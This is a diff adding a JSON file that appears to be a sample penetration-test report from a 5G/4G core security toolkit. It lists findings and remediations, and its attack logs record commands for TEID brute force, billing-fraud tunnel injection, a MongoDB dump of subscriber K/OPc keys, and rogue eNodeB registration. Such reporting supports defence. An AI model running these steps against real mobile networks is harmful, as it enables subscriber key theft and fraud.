@@ -1,0 +1,284 @@
+{
+  "metadata": {
+    "title": "5G/4G Core Network Security Assessment",
+    "assessment_type": "Penetration Test",
+    "target_network": "10.0.0.0/24",
+    "start_time": "2025-12-28 18:00:00",
+    "end_time": "2025-12-28 19:30:00",
+    "analyst": "5G-Gibbon Toolkit",
+    "version": "1.0.0"
+  },
+  "summary": {
+    "total_findings": 4,
+    "severity_breakdown": {
+      "critical": 3,
+      "high": 1,
+      "medium": 0,
+      "low": 0,
+      "info": 0
+    },
+    "total_scans": 3,
+    "total_attacks": 3,
+    "successful_attacks": 3
+  },
+  "findings": [
+    {
+      "title": "TEID Enumeration Possible",
+      "severity": "high",
+      "description": "UPF responds to GTP-U echo requests with sequential TEIDs",
+      "affected_component": "UPF (10.0.0.10)",
+      "evidence": "156 active TEIDs discovered via brute force",
+      "remediation": "Implement TEID randomization and rate limiting",
+      "cvss_score": null,
+      "cwe_id": null
+    },
+    {
+      "title": "Nested Tunnel Injection",
+      "severity": "critical",
+      "description": "Inner GTP tunnel not validated, allowing billing fraud",
+      "affected_component": "UPF (10.0.0.10)",
+      "evidence": "Malicious data injected via nested tunnel",
+      "remediation": "Validate inner tunnel TEIDs, implement DPI",
+      "cvss_score": null,
+      "cwe_id": null
+    },
+    {
+      "title": "MongoDB Exposed Without Authentication",
+      "severity": "critical",
+      "description": "MongoDB accessible without credentials, subscriber keys extracted",
+      "affected_component": "NRF/UDM (10.0.0.30)",
+      "evidence": "156 subscriber K/OPc keys extracted",
+      "remediation": "Enable MongoDB authentication, restrict network access",
+      "cvss_score": null,
+      "cwe_id": null
+    },
+    {
+      "title": "Rogue eNodeB Acceptance",
+      "severity": "critical",
+      "description": "MME accepts S1 connections without certificate validation",
+      "affected_component": "MME (10.0.0.40)",
+      "evidence": "Rogue eNodeB registered successfully",
+      "remediation": "Implement mutual TLS for S1 interface",
+      "cvss_score": null,
+      "cwe_id": null
+    }
+  ],
+  "scan_results": [
+    {
+      "target": "10.0.0.10",
+      "port": 2152,
+      "service": "GTP-U",
+      "state": "open",
+      "banner": "GTP-U User Plane",
+      "vulnerabilities": [
+        "No rate limiting"
+      ]
+    },
+    {
+      "target": "10.0.0.30",
+      "port": 27017,
+      "service": "MongoDB",
+      "state": "open",
+      "banner": "MongoDB 4.4",
+      "vulnerabilities": [
+        "No authentication",
+        "Exposed to network"
+      ]
+    },
+    {
+      "target": "10.0.0.40",
+      "port": 36412,
+      "service": "S1AP",
+      "state": "open",
+      "banner": "MME S1 Interface",
+      "vulnerabilities": [
+        "No certificate validation"
+      ]
+    }
+  ],
+  "attack_results": [
+    {
+      "attack_type": "UPF TEID Enumeration & Billing Fraud",
+      "target": "10.0.0.10",
+      "success": true,
+      "timestamp": "2025-12-28 18:00:01",
+      "duration": 152.5,
+      "details": {
+        "TEIDs discovered": 156,
+        "Billing bypass": "Successful",
+        "Data injected": "1024 bytes"
+      },
+      "findings": [
+        {
+          "title": "TEID Enumeration Possible",
+          "severity": "high",
+          "description": "UPF responds to GTP-U echo requests with sequential TEIDs",
+          "affected_component": "UPF (10.0.0.10)",
+          "evidence": "156 active TEIDs discovered via brute force",
+          "remediation": "Implement TEID randomization and rate limiting",
+          "cvss_score": null,
+          "cwe_id": null
+        },
+        {
+          "title": "Nested Tunnel Injection",
+          "severity": "critical",
+          "description": "Inner GTP tunnel not validated, allowing billing fraud",
+          "affected_component": "UPF (10.0.0.10)",
+          "evidence": "Malicious data injected via nested tunnel",
+          "remediation": "Validate inner tunnel TEIDs, implement DPI",
+          "cvss_score": null,
+          "cwe_id": null
+        }
+      ],
+      "attack_events": [
+        {
+          "timestamp": "2025-12-28 18:00:01",
+          "phase": "Reconnaissance",
+          "technique": "Port Scan",
+          "command": "nmap -sU -p 2152 10.0.0.10",
+          "payload": "",
+          "response": "2152/udp open gtp-u",
+          "success": true,
+          "evidence": {
+            "ports_found": [
+              2152
+            ]
+          }
+        },
+        {
+          "timestamp": "2025-12-28 18:00:15",
+          "phase": "Enumeration",
+          "technique": "TEID Brute Force",
+          "command": "python run.py enumerate teid --target 10.0.0.10 --start 0 --end 10000",
+          "payload": "GTP-U Echo Request with TEID=0x00000001-0x00002710",
+          "response": "Found 156 active TEIDs: 0x00000100, 0x00000101, ...",
+          "success": true,
+          "evidence": {
+            "active_teids": 156
+          }
+        },
+        {
+          "timestamp": "2025-12-28 18:02:30",
+          "phase": "Exploitation",
+          "technique": "Nested Tunnel Injection",
+          "command": "python run.py attack billing --upf 10.0.0.10 --teid 256",
+          "payload": "IP/UDP/GTP/IP/UDP/malicious_data",
+          "response": "Packet accepted, no inner TEID validation",
+          "success": true,
+          "evidence": {
+            "billing_bypass": true,
+            "bytes_injected": 1024
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "MongoDB Key Extraction",
+      "target": "10.0.0.30",
+      "success": true,
+      "timestamp": "2025-12-28 18:05:00",
+      "duration": 78.2,
+      "details": {
+        "Database accessed": "open5gs",
+        "Collections": "subscribers",
+        "Keys extracted": 156
+      },
+      "findings": [
+        {
+          "title": "MongoDB Exposed Without Authentication",
+          "severity": "critical",
+          "description": "MongoDB accessible without credentials, subscriber keys extracted",
+          "affected_component": "NRF/UDM (10.0.0.30)",
+          "evidence": "156 subscriber K/OPc keys extracted",
+          "remediation": "Enable MongoDB authentication, restrict network access",
+          "cvss_score": null,
+          "cwe_id": null
+        }
+      ],
+      "attack_events": [
+        {
+          "timestamp": "2025-12-28 18:05:00",
+          "phase": "Reconnaissance",
+          "technique": "Service Discovery",
+          "command": "curl http://10.0.0.30:80/nnrf-disc/v1/nf-instances",
+          "payload": "",
+          "response": "{\"nfInstances\": [{\"nfType\": \"AMF\"}, ...]}",
+          "success": true,
+          "evidence": {}
+        },
+        {
+          "timestamp": "2025-12-28 18:06:00",
+          "phase": "Exfiltration",
+          "technique": "Key Extraction",
+          "command": "mongosh open5gs --eval \"db.subscribers.find()\"",
+          "payload": "db.subscribers.find({})",
+          "response": "156 subscriber records with K/OPc keys",
+          "success": true,
+          "evidence": {
+            "keys_extracted": 156
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "4G Rogue eNodeB Attack",
+      "target": "10.0.0.40",
+      "success": true,
+      "timestamp": "2025-12-28 18:10:00",
+      "duration": 120.0,
+      "details": {
+        "MME accepted rogue eNB": true,
+        "Certificate validation": "None",
+        "HSS accessed": true
+      },
+      "findings": [
+        {
+          "title": "Rogue eNodeB Acceptance",
+          "severity": "critical",
+          "description": "MME accepts S1 connections without certificate validation",
+          "affected_component": "MME (10.0.0.40)",
+          "evidence": "Rogue eNodeB registered successfully",
+          "remediation": "Implement mutual TLS for S1 interface",
+          "cvss_score": null,
+          "cwe_id": null
+        }
+      ],
+      "attack_events": [
+        {
+          "timestamp": "2025-12-28 18:10:00",
+          "phase": "Reconnaissance",
+          "technique": "S1AP Port Scan",
+          "command": "nmap -sS -p 36412 10.0.0.40",
+          "payload": "",
+          "response": "36412/tcp open s1ap",
+          "success": true,
+          "evidence": {}
+        },
+        {
+          "timestamp": "2025-12-28 18:10:30",
+          "phase": "Exploitation",
+          "technique": "Rogue eNodeB",
+          "command": "python run.py lte rogue-enb --mme 10.0.0.40",
+          "payload": "S1SetupRequest(global_enb_id=0x12345)",
+          "response": "S1SetupResponse accepted",
+          "success": true,
+          "evidence": {
+            "mme_accepted": true
+          }
+        },
+        {
+          "timestamp": "2025-12-28 18:11:00",
+          "phase": "Lateral Movement",
+          "technique": "HSS Query",
+          "command": "python run.py lte hss-probe --hss 10.0.0.50",
+          "payload": "AIR(imsi=\"001010123456789\")",
+          "response": "Auth vectors obtained",
+          "success": true,
+          "evidence": {
+            "auth_vectors": 5
+          }
+        }
+      ]
+    }
+  ]
+}
